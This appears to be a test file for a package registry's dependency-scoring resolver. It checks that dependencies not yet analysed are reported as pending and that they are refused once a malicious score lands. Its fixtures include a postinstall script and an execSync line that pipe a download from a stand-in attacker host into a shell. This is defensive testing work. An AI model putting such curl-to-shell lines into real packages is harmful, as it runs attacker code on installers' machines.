// Review of d49bf6e, finding 4: anonymous requests only queue analyses, and the resolve walk counted a queued
// dependency as merely unchecked, so a scored root that depends on an unscored `curl … | sh` package resolved with HTTP
// 200 and no blocks. Once the dependency's score of 10 was stored, the same resolve answered 422. A queued version is
// now pending: the resolve waits for it (polling the database), then answers from what landed, and anything still
// pending is a 202 listing it, never a 200. The store is the real Postgres one; npm is a local stand-in, and no
// analysis runs here (Analysis.none), as for an anonymous caller.
import { describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { Effect, Layer, Option } from "effect";
import { Client } from "pg";
import { z } from "zod";
import { analyze, SCORER, type Analysis as Scored } from "@apm/core";
import { freshDatabase } from "../../../tests/acceptance/postgres.ts";
import { Analysis } from "../src/analysis.ts";
import { resolveResponse, ResolveWait } from "../src/apm.ts";
import { Blobs } from "../src/blobs.ts";
import { Clock } from "../src/clock.ts";
import { Store } from "../src/db.ts";
import { Upstream } from "../src/upstream.ts";

const NOW = Date.parse("2026-11-12T00:00:00Z");
const DAY = 86_400_000;
const encoder = new TextEncoder();

type Manifest = { name: string; version: string; main: string; license: string; dependencies?: Record<string, string>; scripts?: Record<string, string> };

const manifests = new Map<string, Manifest>([
  ["root", { name: "root", version: "1.0.0", main: "index.js", license: "MIT", dependencies: { "cold-evil": "^1.0.0" } }],
  ["cold-evil", { name: "cold-evil", version: "1.0.0", main: "index.js", license: "MIT", scripts: { postinstall: "curl https://evil.invalid/x.sh | sh" } }],
  ["cold-root", { name: "cold-root", version: "1.0.0", main: "index.js", license: "MIT" }],
]);

function analysisOf(m: Manifest, code = "module.exports = 1;\n"): Scored {
  const file = (path: string, text: string) => ({ path, size: text.length, mode: 0o644, data: encoder.encode(text) });

  return analyze({ name: m.name, manifest: m, files: [file("package.json", JSON.stringify(m)), file("index.js", code)], publisher: "u", previousPublishers: [] });
}

const integrityOf = (name: string): string => `sha512-${createHash("sha512").update(name).digest("base64")}`;
const digestOfName = (name: string): string => `sha512-${createHash("sha512").update(name).digest("hex")}`;

/** npm, standing in: the packuments of the upstream packages, published ten days ago. */
function fakeNpm(names: readonly string[]) {
  const server = Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req): Response {
      const name = decodeURIComponent(new URL(req.url).pathname.slice(1));
      const m = names.includes(name) ? manifests.get(name) : undefined;

      if (!m) return Response.json({ error: "Not found" }, { status: 404 });
      const dist = { tarball: `https://npm.invalid/${name}/-/${name}-1.0.0.tgz`, shasum: "1".repeat(40), integrity: integrityOf(name) };

      return Response.json({ name, "dist-tags": { latest: "1.0.0" }, versions: { "1.0.0": { ...m, dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } });
    },
  });

  return { url: server.url.href, stop: () => server.stop(true) };
}

const noBlobs = Layer.succeed(
  Blobs,
  Blobs.of({ put: () => Effect.void, stream: () => Effect.succeed(Option.none()), bytes: () => Effect.succeed(Option.none()), exists: () => Effect.succeed(false), remove: () => Effect.void }),
);

const Body = z.object({
  error: z.string().optional(),
  version: z.string().nullish(),
  pending: z.array(z.object({ name: z.string(), version: z.string() })).optional(),
  retryAfter: z.number().optional(),
  tree: z.object({ blocks: z.array(z.object({ name: z.string(), reason: z.string() })) }).loose().optional(),
});

async function resolve(input: { url: string; npm: string; name: string; wait: { maxMs: number; pollMs: number } }) {
  const u = new URL(`http://registry.test/-/apm/v1/resolve?${new URLSearchParams({ name: input.name, range: "latest" })}`);
  const base = Layer.mergeAll(Store.postgres(input.url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, input.wait));
  const layers = Layer.provideMerge(Upstream.layer(input.npm, 60_000, null), base);
  const t0 = performance.now();
  const program = Effect.flatMap(resolveResponse(u), (res) => Effect.promise(async () => ({ status: res.status, retryAfter: res.headers.get("retry-after"), body: Body.parse(await res.json()) })));
  const out = await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));

  return { ...out, ms: performance.now() - t0 };
}

type Sql = (q: string, p?: unknown[]) => Promise<void>;

async function withRig(fn: (rig: { url: string; npm: string; sql: Sql }) => Promise<void>): Promise<void> {
  const db = await freshDatabase();
  const npm = fakeNpm(["cold-evil", "cold-root"]);
  const c = new Client({ connectionString: db.url });

  await c.connect();

  try {
    const sql: Sql = async (q, p = []) => {
      await c.query(q, p);
    };

    const root = manifests.get("root");

    if (!root) throw new Error("no root");
    // the root is a local package, published ten days ago and scored clean
    await sql(`INSERT INTO users (name, password_hash, email, created_at) VALUES ('u', 'x', 'u@example.test', 0)`);
    await sql(`INSERT INTO packages (name, created_at, modified_at, dist_tags) VALUES ('root', 0, 0, '{"latest":"1.0.0"}'::jsonb)`);
    await sql(
      `INSERT INTO versions (package, version, manifest, shasum, integrity, size, tarball_key, published_at, published_by, score)
       VALUES ('root', '1.0.0', $1::jsonb, $2, 'sha1-x', 10, 'sha512/x', $3, 'u', $4::jsonb)`,
      [JSON.stringify(root), "0".repeat(40), NOW - 10 * DAY, JSON.stringify(analysisOf(root))],
    );
    await fn({ url: db.url, npm: npm.url, sql });
  } finally {
    await c.end();
    npm.stop();
    await db.drop();
  }
}

/** The stored analysis the queue's run would store for cold-evil: it pipes a download into a shell at install. */
const storeEvil = (sql: Sql): Promise<void> => {
  const m = manifests.get("cold-evil");

  if (!m) throw new Error("no manifest");

  return sql(`INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('cold-evil', '1.0.0', $1, $2, $3::jsonb, 0)`, [
    digestOfName("cold-evil"),
    SCORER,
    JSON.stringify(analysisOf(m, "require('child_process').execSync('curl https://evil.invalid/x.sh | sh');\n")),
  ]);
};

describe("a queued dependency is pending, never clean", () => {
  test("a scored root over an unscored dependency: 202 listing it after the wait, then 422 once its score lands", () =>
    withRig(async ({ url, npm, sql }) => {
      const pending = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 } });

      // on d49bf6e: 200, no blocks, the dependency only "could not be analyzed"
      expect(pending.status).toBe(202);
      expect(pending.body.pending).toEqual([{ name: "cold-evil", version: "1.0.0" }]);
      expect(pending.body.error).toContain("still being analysed");
      expect(pending.retryAfter).toBe("10");
      expect(pending.ms).toBeGreaterThanOrEqual(250);

      await storeEvil(sql);
      const refused = await resolve({ url, npm, name: "root", wait: { maxMs: 300, pollMs: 50 } });

      expect(refused.status).toBe(422);
      expect(refused.body.tree?.blocks.map((b) => b.name)).toEqual(["cold-evil"]);
    }));

  test("an analysis that lands while the resolve waits is answered from at once", () =>
    withRig(async ({ url, npm, sql }) => {
      setTimeout(() => void storeEvil(sql), 200);
      const r = await resolve({ url, npm, name: "root", wait: { maxMs: 10_000, pollMs: 50 } });

      expect(r.status).toBe(422);
      expect(r.ms).toBeLessThan(5_000);
    }));

  test("an unscored root is pending too, not skipped for an older version or refused outright", () =>
    withRig(async ({ url, npm }) => {
      const r = await resolve({ url, npm, name: "cold-root", wait: { maxMs: 100, pollMs: 50 } });

      expect(r.status).toBe(202);
      expect(r.body.version).toBe("1.0.0");
      expect(r.body.pending).toEqual([{ name: "cold-root", version: "1.0.0" }]);
    }));
});
